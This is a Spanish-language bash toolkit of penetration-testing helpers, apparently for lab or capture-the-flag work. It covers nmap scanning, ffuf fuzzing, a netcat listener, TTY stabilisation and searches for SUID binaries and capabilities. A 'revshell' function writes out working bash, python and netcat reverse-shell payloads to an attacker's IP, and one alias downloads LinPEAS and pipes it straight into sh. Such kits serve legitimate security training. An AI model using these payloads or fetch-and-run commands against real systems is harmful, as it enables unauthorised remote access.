#!/bin/bash
#
#  _   _  ______ ______  _   _   __  __ 
# | \ | ||  ____||  ____|| \ | | |  \/  |
# |  \| || |__   | |__   |  \| | | \  / |
# | . ` ||  __|  |  __|  | . ` | | |\/| |
# | |\  || |____ | |____ | |\  | | |  | |
# |_| \_||______||______||_| \_| |_|  |_|
#
# ARSENAL DE NEENAH v3.0 - KIT DE OPERACIONES PARA LINUX
#

# ===================================================================
# 1. UTILIDADES GENERALES (NAVAJA SUIZA)
# ===================================================================

# Inicia un servidor web simple en el directorio actual.
# Uso: serve (usa el puerto 8000) o serve <puerto>
serve() {
    local port="${1:-8000}"
    echo -e "[\e[92m+\e[0m] Sirviendo archivos en http://0.0.0.0:$port ..."
    python3 -m http.server "$port"
}

# Inicia un listener de Netcat verboso en un puerto.
# Uso: listen <puerto> (por defecto usa 443)
listen() {
    local port="${1:-443}"
    echo -e "[\e[92m+\e[0m] Escuchando en el puerto $port..."
    sudo nc -lvnp "$port"
}

# Copia la IP de la interfaz tun0 (o la especificada) al portapapeles.
# Uso: tunip (para tun0) o tunip <interfaz>
tunip() {
    local iface="${1:-tun0}"
    local ip=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    if [ -n "$ip" ]; then
        echo -n "$ip" | xclip -sel clip
        echo -e "[\e[92m+\e[0m] IP de $iface [\e[96m$ip\e[0m] copiada al portapapeles."
    else
        echo -e "[\e[91m-\e[0m] Interfaz '$iface' no encontrada o sin IP." >&2
    fi
}


# ===================================================================
# 2. RECONOCIMIENTO Y FUZZING WEB
# ===================================================================

# Escáner Nmap versátil que organiza los resultados.
# Uso: scan <IP> [argumentos_de_nmap]
scan() {
    if [ $# -eq 0 ]; then
        echo "[i] Uso: scan <IP> [argumentos_nmap]"
        return 1
    fi
    local target=$1; shift;
    mkdir -p "$target/nmap"; 
    echo -e "[\e[92m+\e[0m] Lanzando escaneo Nmap contra $target..."
    sudo nmap -sC -sV -T4 --min-rate 5000 -v -oN "$target/nmap/scan.nmap" "$target" "$@";
    echo -e "[\e[92m+\e[0m] Escaneo guardado en $target/nmap/scan.nmap"
}

# Fuzzer web versátil con ffuf.
# Uso: fuzz <URL> [argumentos_ffuf]
# Ejemplo Directorio: fuzz http://<IP>/FUZZ
# Ejemplo VHost: fuzz -H 'Host: FUZZ.<dominio>' http://<IP>
fuzz() {
    if [ $# -eq 0 ]; then
        echo "[i] Uso: fuzz <URL_CON_FUZZ_O_HEADER> [argumentos_ffuf]"
        return 1
    fi
    # Selecciona la wordlist automáticamente basado en si FUZZ está en la URL o en una cabecera
    local wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
    if [[ "$*" == *"-H"* && "$*" == *"FUZZ"* ]]; then
        wordlist="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
        echo "[+] Detectado modo VHost. Usando wordlist de subdominios."
    else
        echo "[+] Detectado modo Directorio/Archivo. Usando wordlist de directorios."
    fi
    ffuf -c -t 150 -w "$wordlist" -e .php,.html,.txt,.js,.bak,.old "$@"
}


# ===================================================================
# 3. ACCESO Y GESTIÓN DE SHELLS
# ===================================================================

# Generador de Reverse Shells para copiar y pegar.
# Uso: revshell <tipo> <ip> <puerto>
# Tipos soportados: bash, python, nc
revshell() {
    local type=$1; local ip=$2; local port=$3; local payload="";
    case $type in
        bash) payload="bash -i >& /dev/tcp/$ip/$port 0>&1";;
        python) payload="python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'";;
        nc) payload="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f";;
        *) echo "[-] Tipos soportados: bash, python, nc"; return 1;;
    esac
    echo "$payload" | xclip -sel clip
    echo -e "[\e[92m+\e[0m] Reverse shell de [\e[96m$type\e[0m] para $ip:$port copiada al portapapeles."
}

# Estabilización de una TTY básica.
# Copia el comando PTY al portapapeles y muestra los pasos manuales.
stabilize() {
    local cmd="python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    echo "$cmd" | xclip -sel clip
    echo -e "[\e[92m+\e[0m] Comando PTY copiado. Después de ejecutarlo, recuerda la secuencia:"
    echo -e "  1. Pulsa \e[96mCtrl+Z\e[0m"
    echo -e "  2. Escribe en tu terminal: \e[96mstty raw -echo; fg\e[0m y pulsa Enter"
    echo -e "  3. En la shell remota, escribe \e[96mreset\e[0m y pulsa Enter"
    echo -e "  4. Configura el terminal: \e[96mexport TERM=xterm\e[0m"
}


# ===================================================================
# 4. POST-EXPLOTACIÓN Y ESCALADA (LINUX)
# ===================================================================

# Descarga y ejecuta LinPEAS en memoria para enumeración de Linux.
# Uso: enumlinux
alias enumlinux="echo '[+] Lanzando LinPEAS desde memoria...'; curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"

# Busca binarios con permisos SUID y SGID.
# Uso: findsuid
alias findsuid='echo "[+] Buscando binarios SUID/SGID..."; find / -type f -perm -6000 -ls 2>/dev/null'

# Busca binarios con capabilities de Linux.
# Uso: findcaps
alias findcaps='echo "[+] Buscando capabilities..."; /usr/sbin/getcap -r / 2>/dev/null'


echo -e "\n[\e[92m+\e[0m] Arsenal de Neenah v3.0 (Linux Edition) cargado. Herramientas listas para operar."